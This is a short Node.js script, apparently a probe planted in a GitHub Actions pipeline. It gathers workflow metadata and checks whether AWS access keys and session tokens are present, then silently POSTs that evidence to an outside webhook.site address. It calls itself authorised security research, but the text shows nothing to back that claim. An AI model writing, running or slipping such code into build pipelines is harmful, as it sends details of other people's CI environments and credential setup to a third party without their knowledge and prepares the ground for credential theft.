const https = require('https');
const { URL } = require('url');

const present = (name) => Boolean(process.env[name]);
const evidence = {
  research: 'L00002',
  job: process.env.GITHUB_JOB || '',
  runId: process.env.GITHUB_RUN_ID || '',
  runAttempt: process.env.GITHUB_RUN_ATTEMPT || '',
  eventName: process.env.GITHUB_EVENT_NAME || '',
  repository: process.env.GITHUB_REPOSITORY || '',
  ref: process.env.GITHUB_REF || '',
  awsCredentialPresence: {
    accessKeyId: present('AWS_ACCESS_KEY_ID'),
    secretAccessKey: present('AWS_SECRET_ACCESS_KEY'),
    sessionToken: present('AWS_SESSION_TOKEN')
  }
};
console.log('AUTHORIZED_SECURITY_RESEARCH_L00002 ' + JSON.stringify(evidence));
if (process.env.PROBE_DISABLE_NETWORK === '1') process.exit(0);
const endpoint = new URL("https://webhook.site/b894fc0b-f9df-416d-a71c-7d036b183325");
const request = https.request({
  hostname: endpoint.hostname,
  path: endpoint.pathname + endpoint.search,
  method: 'POST',
  timeout: 8000,
  headers: { 'Content-Type': 'application/json', 'User-Agent': 'authorized-security-research-L00002' }
}, (response) => { response.resume(); });
request.on('timeout', () => request.destroy());
request.on('error', () => {});
request.end(JSON.stringify(evidence));
